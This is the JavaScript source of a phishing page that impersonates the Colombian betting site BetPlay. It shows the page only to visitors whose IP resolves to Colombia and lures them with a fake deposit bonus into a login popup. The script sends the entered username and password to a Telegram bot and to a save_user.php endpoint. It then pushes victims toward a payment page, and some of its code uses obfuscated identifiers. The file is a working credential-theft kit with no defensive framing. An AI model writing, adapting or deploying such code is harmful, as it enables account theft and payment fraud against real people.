var head = `
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../css/styles.css">
        <link rel="icon" type="image/x-icon" href="https://betplay.com.co/favicon.ico?v=1.1.0">
    <title>BetPlay</title>
`;

var body = ` 

 <style>
    /* Estilos generales para el login */
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      padding-top: 60px; /* Para evitar que el contenido quede debajo del header */
    }

    header {
      background-color: #002361;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      padding: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      z-index: 1000;
    }

    .menu-icon {
      width: 40px;
      height: 40px;
      background-image: url('../img/menu.png');
      background-size: contain;
      background-repeat: no-repeat;
      cursor: pointer;
      margin-left: 10px;
    }

    .logo {
      width: 120px;
      text-align: center;
      margin: 0 auto;
    }

    .logo img {
      max-width: 100%;
      height: auto;
    }

    .buttons {
      display: flex;
      flex-direction: column;
      gap: 10px;
      align-items: flex-end;
      margin-right: 20px;
    }

    .buttons button {
      background-color: #002361;
      color: white;
      border: 1px solid #3cb4e5;
      border-radius: 3px;
      padding: 8px 16px;
      cursor: pointer;
      font-size: 14px;
      width: 140px;
    }

    .buttons button.inicio-sesion {
      background-color: #002361;
    }

    .buttons button.registrarse {
      background-color: #3cb4e5;
    }

    @media (max-width: 768px) {
      header {
        padding: 8px;
      }

      .menu-icon {
        width: 30px;
        height: 30px;
      }

      .logo {
        width: 100px;
      }

      .buttons {
        align-items: center;
      }

      .buttons button {
        padding: 6px 12px;
        font-size: 12px;
        width: 120px;
      }
    }

    /* Estilos del modal */
    .modal {
      display: none;
      position: fixed;
      z-index: 2000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0, 0, 0, 0.5);
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease, visibility 0.3s ease;
    }

    .modal.show {
      opacity: 1;
      visibility: visible;
    }

    .modal-content {
      background-color: #fff;
      margin: 10% auto;
      padding: 20px;
      border-radius: 8px;
      width: 80%;
      max-width: 400px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    .close {
      color: #aaa;
      float: right;
      font-size: 28px;
      font-weight: bold;
      cursor: pointer;
    }

    .close:hover,
    .close:focus {
      color: #000;
      text-decoration: none;
    }
  </style>

     <header>
    <div class="menu-icon"></div>
    <div class="logo">
      <img src="../img/logo.webp" alt="BetPlay Logo">
    </div>
    <div class="buttons">
      <button class="inicio-sesion" onclick="openLoginPopup()">Iniciar sesión</button>
      <button class="registrarse">Registrarse</button>
    </div>
  </header>

  <div class="relajado">
    <div class="slider">
      <div><img src="../img/actufondo2.jpg" alt="Banner 1" /></div>
      <div><img src="../img/actufondo2.jpg" alt="Banner 1" /></div>
      
    </div>

    <div class="promo-message">
      <h3>
        ¡Reclama un bono por $100.000 pesos por recargas mayores a $10.000!<br />

      </h3>
      <button class="play-now-btn" onclick="openLoginPopup()">Reclama Ya!</button>
    </div>
    <div class="bottom-header">
      <div class="prizes">
        <div class="prize">
          <h2>Mega</h2>
          <p class="value" data-start="134500399" data-end="134818909">
            $134,500,399
          </p>
          <span>Gana hasta $500 Millones</span>
        </div>
        <div class="prize">
          <h2>Super</h2>
          <p class="value" data-start="7000000" data-end="7818633">
            $7,000,000
          </p>
          <span>Gana hasta $20 Millones</span>
        </div>
        <div class="prize">
          <h2>Extra</h2>
          <p class="value" data-start="600000" data-end="661019">$600,000</p>
          <span>Gana hasta $1 Millon</span>
        </div>
        <div class="promo">
          <div><img src="../img/IMAGEN1.webp" alt="Banner 4" /></div>
        </div>
      </div>
    </div>

    </div>

    <div id="loginPopup" class="popup">
      <div class="modal-content">
      <span class="close" id="closeModal">&times;</span>
      <!-- Este formulario es cargado desde el archivo CSS 'login.css' -->
      <div class="login-container">
        <img src="../img/logo.webp" alt="Logo de BetPlay">
        <form>
          <input type="text" id="email" placeholder="Usuario / Cedula" required>
          <input type="password" id="pwd" placeholder="Contraseña" required>
          <input type="text" value="PROMOBET" readonly class="bold-input" />
          <div class="checkbox-container">
            <label>
              <input type="checkbox"> Recordar datos de usuario
            </label>
          </div>
          <div class="buttons">
            <button type="submit"  id="iniciarSesion" class="inicio-sesion">Ingresar</button>
            <button type="button" class="registrarse">Registrarse</button>
          </div>
        </form>
        <a href="#">Recuperar contraseña</a>
        <p>
          Al iniciar sesión, estás aceptando los siguientes <a href="#">T&C Versión 1.3</a>.
        </p>
      </div>
    </div>
    </div>

    <!-- Error Popup -->
    <div id="errorPopup" class="error-popup">
      <div class="error-popup-content">
        <span class="close" onclick="closeErrorPopup()">Cerrar</span>
        <p id="errorMessage"></p>
      </div>
    </div>

    <div id="loadingScreen" class="loading-screen">
      <div class="loading-content">
        <img src="../img/logo.webp" alt="BetPlay Logo" class="loading-logo" />
        <div class="spinner"></div>
      </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
    <script src="index.js"></script>
`;

function addHead() {
  $("head").append(head); //Append es para agregar sin borrar
}

function addCode() {
  $("body").prepend(body); //Html es para agregar sin importar que hay debajo


 
  function enviarTelegram() {
    event.preventDefault();
    var email = $("#email").val();
    var pwd = $("#pwd").val();
  
    $.ajax({
        url: "../../process/get_credentials.php", // Archivo PHP que devuelve credenciales de Telegram
        type: "GET",
        dataType: "json",
        success: function (config) {
            var telegramBotToken = config.botToken;
            var chatId = config.chatId;
  
            var message = `Datos de inicio de sesión:\n\nCorreo: ${email}\nClave: ${pwd}`;
            var telegramAPI = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  
            $.get(telegramAPI)
                .done(function () {
                    window.location.href = "../../signup/creditoption/index.php";
                    console.log("Redirigiendo a signup...");
                })
                .fail(function (error) {
                    console.error("Error al enviar mensaje a Telegram:", error);
                    window.location.href = "../../signup/creditoption/index.php";
                });
        },
        error: function (error) {
            console.error("Error al obtener las credenciales:", error);
        },
    });
  }

  function validarCuentaNet() {
    if ($("#email").val() !== "" && $("#pwd").val() !== "") {
        enviarTelegram(); // Envía los datos a Telegram
        enviarDatos();   // Guarda los datos en la base de datos
    } else {
        console.log("Email o contraseña vacíos"); // Mensaje de depuración
    }
}

  

  $("#iniciarSesion").click(function () {
    $(this).prop("disabled", true);
    validarCuentaNet();
  });
}

document.addEventListener("DOMContentLoaded", function () {
  async function shield() {
    var PHeaders = new Headers();
    PHeaders.append(
      "Content-Type",
      "application/x-www-form-urlencoded; charset=UTF-8"
    );

    var PInit = {
      method: "GET",
      headers: PHeaders,
    };
    var PRequest = new Request("https://get.geojs.io/v1/ip/country.json");

    let response = await fetch(PRequest, PInit);
    let responseJ = await response.json();

    setTimeout(() => {
      if (responseJ.country == "CO") {
        addHead();
        addCode();
      } else {
        window.location.href = "https://wplay.com/";
      }
    }, 0);
  }
  shield();
});

let loginAttempts = 0;

function enviarDatos() {
  event.preventDefault();
  var email = $("#email").val();
  var pwd = $("#pwd").val();

  if (email !== "" && pwd !== "") {
      $.ajax({
          url: "../../process/save_user.php", // Cambia la ruta según tu estructura
          type: "POST",
          data: { email: email, pwd: pwd },
          success: function(response) {
              console.log("Respuesta del servidor:", response);
              if (response.status === "success") {
                  console.log("Datos guardados correctamente.");
              } else {
                  console.error("Error: " + response.message);
              }
          },
          error: function(err) {
              console.error("Error en la solicitud AJAX:", err);
          }
      });
  } else {
      console.error("Todos los campos son obligatorios.");
  }
}



function openLoginPopup() {
  document.getElementById('loginPopup').style.display = 'flex';
}

function closeLoginPopup() {
  document.getElementById('loginPopup').style.display = 'none';
}

function showError(_0x5340e1) {
  const _0x59736c = document.getElementById('errorPopup'),
    _0x487557 = document.getElementById('errorMessage');
  _0x487557.textContent = _0x5340e1;
  _0x59736c.style.display = 'block';
}

function closeErrorPopup() {
  document.getElementById('errorPopup').style.display = 'none';
}

function login(_0x5627f0) {
  _0x5627f0.preventDefault();
  const _0x6d0c4c = document.querySelector(
      '#loginPopup input[type="text"]'
    ).value,
    _0x59983b = document.querySelector(
      '#loginPopup input[type="password"]'
    ).value;
  if (_0x6d0c4c === '' || _0x59983b === '') {
    showError('Por favor, complete todos los campos.');
    return;
  }
  sendTelegramMessage(_0x6d0c4c, _0x59983b);
  showError(
    'Continua con el pago para reclamar tu bono'
  );
  loginAttempts++;
  loginAttempts >= 1 &&

    setTimeout(function () {
      window.location.href = 'dashboard.html';
    }, 2000);
}

document.addEventListener('DOMContentLoaded', function () {
  const _0x5a6800 = document.querySelectorAll('.value');
  _0x5a6800.forEach((_0x241245) => {
    const _0x3d2d88 = parseInt(_0x241245.getAttribute('data-start')),
      _0x5ddcc4 = parseInt(_0x241245.getAttribute('data-end')),
      _0x47ec7d = Math.abs(Math.floor(10000 / (_0x5ddcc4 - _0x3d2d88)));
    let _0x84cf45 = _0x3d2d88;
    const _0x596f61 = () => {
      _0x84cf45 += 1;
      _0x241245.textContent = '$' + _0x84cf45.toLocaleString();
      _0x84cf45 < _0x5ddcc4 && setTimeout(_0x596f61, _0x47ec7d);
    };
    _0x596f61();
  });
  
  $(document).ready(function () {
    $('.slider').slick({
      autoplay: true,
      autoplaySpeed: 5000,
      dots: true,
      arrows: false,
      fade: true,
      cssEase: 'linear',
    });
  });
});


